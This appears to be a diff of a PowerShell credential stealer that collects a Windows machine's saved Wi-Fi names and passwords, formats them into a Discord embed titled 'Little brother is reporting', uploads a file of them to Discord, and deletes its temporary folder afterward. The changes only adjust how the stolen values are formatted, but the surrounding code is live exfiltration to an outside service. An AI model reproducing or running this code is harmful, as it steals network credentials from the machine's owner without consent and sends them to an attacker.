@@ -27,8 +27,8 @@ $forEmbed =  [PSCustomObject]@{
     'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting: ' 
     'color'       = '16744960'
     'fields'   = @(@{
-    'name' = [string]$wifinames
-    'value' = [string]$wifipass 
+    'name' = $wifinames
+    'value' = $wifipass.Replace(":", "") | Format-List 
     })
 }
 
@@ -56,7 +56,6 @@ $touchedOutput = $originalOutput.Replace("C:\Users\$env:username\AppData\Local\T
 $loggedwifis = $touchedOutput -replace "\.xml.*?\:"
 $wifinames = $loggedwifis | select-string -Pattern '(Wi-Fi-.*:)' | ForEach-Object { $_.Matches.Value } | Format-List
 $wifipass = $loggedwifis | select-string -Pattern '(:.*)' | ForEach-Object { $_.Matches.Value }
-$wifipass.Replace(":", "") | Format-List
 Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse
